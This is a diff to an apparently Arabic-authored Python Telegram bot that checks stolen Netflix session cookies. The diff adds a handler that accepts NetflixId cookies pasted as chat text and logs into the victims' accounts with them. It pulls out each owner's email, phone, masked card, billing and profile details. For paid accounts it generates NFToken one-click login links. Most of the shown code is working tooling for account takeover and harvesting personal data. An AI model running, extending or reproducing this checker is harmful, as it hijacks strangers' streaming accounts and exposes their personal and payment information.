@@ -18,8 +18,8 @@ from urllib3.exceptions import InsecureRequestWarning
 
 # Telegram imports
 try:
-    from telegram import Update, BotCommand
-    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+    from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
+    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
     TELEGRAM_AVAILABLE = True
 except ImportError:
     TELEGRAM_AVAILABLE = False
@@ -301,50 +301,21 @@ def normalize_phone_number(phone, country_code=None):
 def get_full_country_name(country_code):
     """تحويل كود الدولة لاسم كامل"""
     countries = {
-        "ZA": "South Africa",
-        "EG": "Egypt",
-        "SA": "Saudi Arabia",
-        "AE": "United Arab Emirates",
-        "US": "United States",
-        "GB": "United Kingdom",
-        "IN": "India",
-        "PK": "Pakistan",
-        "RO": "Romania",
-        "ID": "Indonesia",
-        "MY": "Malaysia",
-        "SG": "Singapore",
-        "PH": "Philippines",
-        "TH": "Thailand",
-        "VN": "Vietnam",
-        "BR": "Brazil",
-        "MX": "Mexico",
-        "CA": "Canada",
-        "AU": "Australia",
-        "DE": "Germany",
-        "FR": "France",
-        "ES": "Spain",
-        "IT": "Italy",
-        "TR": "Turkey",
-        "NL": "Netherlands",
-        "SE": "Sweden",
-        "NO": "Norway",
-        "DK": "Denmark",
-        "FI": "Finland",
-        "PL": "Poland",
-        "GR": "Greece",
-        "PT": "Portugal",
-        "IE": "Ireland",
-        "BE": "Belgium",
-        "CH": "Switzerland",
-        "AT": "Austria",
-        "CZ": "Czech Republic",
-        "HU": "Hungary",
-        "IL": "Israel",
-        "JP": "Japan",
-        "KR": "South Korea",
-        "CN": "China",
-        "TW": "Taiwan",
-        "HK": "Hong Kong",
+        "ZA": "South Africa", "EG": "Egypt", "SA": "Saudi Arabia",
+        "AE": "United Arab Emirates", "US": "United States",
+        "GB": "United Kingdom", "IN": "India", "PK": "Pakistan",
+        "RO": "Romania", "ID": "Indonesia", "MY": "Malaysia",
+        "SG": "Singapore", "PH": "Philippines", "TH": "Thailand",
+        "VN": "Vietnam", "BR": "Brazil", "MX": "Mexico",
+        "CA": "Canada", "AU": "Australia", "DE": "Germany",
+        "FR": "France", "ES": "Spain", "IT": "Italy",
+        "TR": "Turkey", "NL": "Netherlands", "SE": "Sweden",
+        "NO": "Norway", "DK": "Denmark", "FI": "Finland",
+        "PL": "Poland", "GR": "Greece", "PT": "Portugal",
+        "IE": "Ireland", "BE": "Belgium", "CH": "Switzerland",
+        "AT": "Austria", "CZ": "Czech Republic", "HU": "Hungary",
+        "IL": "Israel", "JP": "Japan", "KR": "South Korea",
+        "CN": "China", "TW": "Taiwan", "HK": "Hong Kong",
     }
     return countries.get(country_code.upper(), country_code)
 
@@ -1004,12 +975,10 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
         payment = "Credit Card"
     
     card = decode_netflix_value(info.get("maskedCard")) or "N/A"
-    card_display = ""
-    if card != "N/A" and card:
-        card_display = f"Card: {card}"
+    card_display = f"Card: {card}" if card != "N/A" and card else ""
     
     phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
-    phone_verified = "Verified" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "Not Verified"
+    phone_verified = "Yes" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "No"
     quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
     streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
     hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
@@ -1141,6 +1110,138 @@ Filter: Premium accounts only
     return message
 
 
+# ==================== EXTRACT COOKIES FROM TEXT MESSAGE ====================
+
+def extract_cookies_from_text(text):
+    """استخراج الكوكيز من نص الرسالة مباشرة"""
+    patterns = [
+        r'NetflixId=([^\s]+)',
+        r'"NetflixId"\s*:\s*"([^"]+)"',
+        r'NetflixId["\s:=]+([A-Za-z0-9%&=_-]+)',
+    ]
+    
+    for pattern in patterns:
+        match = re.search(pattern, text, re.IGNORECASE)
+        if match:
+            netflix_id = match.group(1).strip()
+            cookie_text = f".netflix.com\tTRUE\t/\tTRUE\t0\tNetflixId\t{netflix_id}\n"
+            return cookie_text
+    
+    return None
+
+
+def format_result_without_cookie(info, is_subscribed, nftoken_data=None, config=None):
+    """تنسيق النتيجة بدون سطر الكوكيز - شكل بنقط بسيط"""
+    if config is None:
+        config, _ = load_config()
+    
+    plan_key, plan_label = derive_plan_info(info, is_subscribed)
+    status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
+    
+    account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
+    if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
+        account_name = get_name_from_profiles(info)
+    
+    email = decode_netflix_value(info.get("email")) or "Unknown"
+    email = clean_text(email)
+    
+    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
+    country = format_country_with_flag(country_raw)
+    
+    plan = plan_label
+    price = decode_netflix_value(info.get("planPrice")) or "N/A"
+    member_since = format_member_since(info.get("memberSince")) or "Unknown"
+    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
+    
+    payment = extract_payment_method_strong("", info)
+    if payment == "Unknown" or not payment:
+        payment = "Credit Card"
+    
+    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
+    card_display = f"• Card: {card}" if card != "N/A" and card else ""
+    
+    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
+    phone_verified = "Yes" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "No"
+    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
+    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
+    hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
+    extra_member = "Yes" if is_extra_member_account(info) else "No"
+    email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
+    membership_status = get_membership_status_display(info.get("membershipStatus") or "Unknown")
+    
+    profiles_raw = info.get("profiles") or ""
+    clean_profiles, clean_profiles_count = clean_profile_names(profiles_raw)
+    
+    final_clean_profiles = []
+    for name in clean_profiles:
+        if 'api' in name.lower() or 'identifier' in name.lower() or 'build' in name.lower():
+            continue
+        if len(name) > 2 and name[0].isupper():
+            final_clean_profiles.append(name)
+        elif len(name) > 3:
+            final_clean_profiles.append(name)
+    
+    if not final_clean_profiles:
+        final_clean_profiles = clean_profiles
+    
+    profiles_display = ", ".join(final_clean_profiles[:15]) if final_clean_profiles else "None"
+    profiles_count = len(final_clean_profiles) if final_clean_profiles else (info.get("profileCount") or 0)
+    
+    lines = []
+    lines.append(f"*Status:* `{status}`")
+    lines.append("")
+    lines.append("*Account Details:*")
+    lines.append(f"• Name: `{account_name}`")
+    lines.append(f"• Email: `{email}`")
+    lines.append(f"• Country: `{country}`")
+    lines.append(f"• Plan: `{plan}`")
+    
+    if is_subscribed:
+        if price != "N/A" and price:
+            lines.append(f"• Price: `{price}`")
+        if member_since != "Unknown":
+            lines.append(f"• Member Since: `{member_since}`")
+        if next_billing != "Unknown":
+            lines.append(f"• Next Billing: `{next_billing}`")
+        if payment and payment != "Unknown":
+            lines.append(f"• Payment: `{payment}`")
+        if card_display:
+            lines.append(card_display)
+        if phone != "N/A" and phone:
+            lines.append(f"• Phone: `{phone} ({phone_verified})`")
+        if quality != "Unknown":
+            lines.append(f"• Quality: `{quality}`")
+        if streams != "Unknown":
+            lines.append(f"• Streams: `{streams}`")
+        lines.append(f"• Hold Status: `{hold}`")
+        lines.append(f"• Extra Member: `{extra_member}`")
+        lines.append(f"• Email Verified: `{email_verified}`")
+        lines.append(f"• Membership Status: `{membership_status}`")
+    else:
+        lines.append(f"• Email Verified: `{email_verified}`")
+    
+    lines.append("")
+    lines.append("*Profiles:*")
+    lines.append(f"• Connected Profiles: `{profiles_count}`")
+    lines.append(f"• Profiles: `{profiles_display}`")
+    
+    return "\n".join(lines), plan_key
+
+
+def build_inline_keyboard(nftoken_data, mode):
+    """بناء أزرار تفاعلية للـ NFToken (بدون زر Close)"""
+    keyboard = []
+    
+    if nftoken_data and has_usable_nftoken(nftoken_data):
+        token = nftoken_data["token"]
+        if mode == "pc" or mode == "both":
+            keyboard.append([InlineKeyboardButton("💻 PC Login", url=f"https://netflix.com/?nftoken={token}")])
+        if mode == "mobile" or mode == "both":
+            keyboard.append([InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}")])
+    
+    return InlineKeyboardMarkup(keyboard) if keyboard else None
+
+
 # ==================== TELEGRAM BOT HANDLERS ====================
 
 async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1160,8 +1261,9 @@ async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ⚙️ HOW TO USE:
    1️⃣ Export cookies (.txt or .json)
    2️⃣ Send files directly (single or ZIP)
-   3️⃣ Watch progress bar
-   4️⃣ Receive files by plan (Premium/Standard/Basic/Free)
+   3️⃣ OR send cookie text in chat
+   4️⃣ Watch progress bar
+   5️⃣ Receive files by plan
 
 🕹️ COMMANDS:
    /start      → Show menu
@@ -1187,6 +1289,7 @@ STEP 1: Export Cookies
 STEP 2: Send Files
    - Send single .txt or .json
    - OR send ZIP with multiple files
+   - OR paste cookie text directly in chat
 
 STEP 3: Get Results
    - PREMIUM_ACCOUNTS.txt (Premium plans)
@@ -1226,6 +1329,102 @@ async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⏹️ Cancellation requested - Task will stop after current file")
     else:
         await update.message.reply_text("ℹ️ No active task to cancel")
+
+
+# ==================== TEXT MESSAGE HANDLER ====================
+
+async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالجة الرسائل النصية - استخراج الكوكيز من النص"""
+    global stats
+    
+    uid = update.effective_user.id
+    text = update.message.text
+    
+    # لو الأمر /cancel أو /start أو أي أمر، نتجاهل
+    if text.startswith('/'):
+        return
+    
+    # استخراج الكوكيز من النص
+    cookie_text = extract_cookies_from_text(text)
+    
+    if not cookie_text:
+        await update.message.reply_text("❌ لم يتم العثور على كوكيز صالحة في النص المرسل.\n\n📌 تأكد من إرسال نص يحتوي على `NetflixId=`")
+        return
+    
+    status_msg = await update.message.reply_text("🔄 جاري معالجة الكوكيز...")
+    
+    # تحويل النص إلى ملف مؤقت
+    temp_filename = f"temp_{uid}_{int(time.time())}.txt"
+    temp_path = os.path.join(cookies_folder, temp_filename)
+    write_text_file_safely(temp_path, cookie_text)
+    
+    # استخراج الباندلز
+    with open(temp_path, 'r', encoding='utf-8') as f:
+        content = f.read()
+    bundles = extract_netflix_cookie_bundles(content)
+    
+    if not bundles:
+        await status_msg.edit_text("❌ لم يتم العثور على كوكيز صالحة في النص المرسل.")
+        if os.path.exists(temp_path):
+            os.remove(temp_path)
+        return
+    
+    bundle = bundles[0]
+    cookies = bundle.get("cookies", {})
+    
+    if not has_required_netflix_cookies(cookies):
+        await status_msg.edit_text("❌ الكوكيز ناقصة - تأكد من وجود `NetflixId`")
+        if os.path.exists(temp_path):
+            os.remove(temp_path)
+        return
+    
+    await status_msg.edit_text("🔄 جاري الاتصال بنيتفليكس...")
+    
+    # الاتصال بخدمة نيتفليكس
+    session = requests.Session()
+    session.cookies.update(cookies)
+    response_text, status_code, info = get_account_page(session, None, 15)
+    
+    if status_code == 200 and info and has_any_account_info(info):
+        is_sub = is_subscribed_account(info)
+        config, _ = load_config()
+        
+        # إنشاء NFToken للأكاونتات المدفوعة
+        nftoken_data = None
+        nftoken_mode = get_nftoken_mode(config)
+        if nftoken_mode != "false" and is_sub:
+            nftoken_data, _ = create_nftoken(cookies, 1)
+        
+        mode = context.user_data.get('mode', 'fullinfo')
+        
+        if mode == 'tokenonly' and nftoken_data:
+            email = info.get("email", "Unknown")
+            result_text = f"✅ *Account:* `{email}`\n\n*NFToken Login Links:*\n[💻 PC Login](https://netflix.com/?nftoken={nftoken_data['token']})\n[📱 Phone Login](https://netflix.com/unsupported?nftoken={nftoken_data['token']})"
+            await status_msg.delete()
+            await update.message.reply_text(result_text, parse_mode="Markdown", disable_web_page_preview=True)
+        else:
+            # تنسيق النتيجة بدون الكوكيز
+            result_text, plan_key = format_result_without_cookie(info, is_sub, nftoken_data, config)
+            keyboard = build_inline_keyboard(nftoken_data, nftoken_mode)
+            
+            await status_msg.delete()
+            if keyboard:
+                await update.message.reply_text(result_text, parse_mode="Markdown", reply_markup=keyboard, disable_web_page_preview=True)
+            else:
+                await update.message.reply_text(result_text, parse_mode="Markdown", disable_web_page_preview=True)
+        
+        stats['total'] += 1
+        if is_sub:
+            stats['valid'] += 1
+        else:
+            stats['free'] += 1
+    else:
+        await status_msg.edit_text(f"❌ فشل الاتصال أو الكوكيز غير صالحة (HTTP {status_code})")
+        stats['failed'] += 1
+    
+    # تنظيف الملف المؤقت
+    if os.path.exists(temp_path):
+        os.remove(temp_path)
 
 
 # ==================== PROCESS SINGLE BUNDLE ====================
@@ -1666,13 +1865,20 @@ def main():
     print("="*50)
     
     app = Application.builder().token(BOT_TOKEN).build()
+    
+    # Commands
     app.add_handler(CommandHandler("start", bot_start))
     app.add_handler(CommandHandler("help", bot_help))
     app.add_handler(CommandHandler("stats", bot_stats))
     app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
     app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
     app.add_handler(CommandHandler("cancel", bot_cancel))
+    
+    # File handlers
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    
+    # Text message handler (for cookies in chat)
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
     
     import asyncio
     try:
@@ -1681,6 +1887,7 @@ def main():
         pass
     
     print("Bot is ready! Send /start on Telegram")
+    print("Send cookies as text message OR send .txt/.json/.zip files")
     print("Press Ctrl+C to stop\n")
     app.run_polling()
 
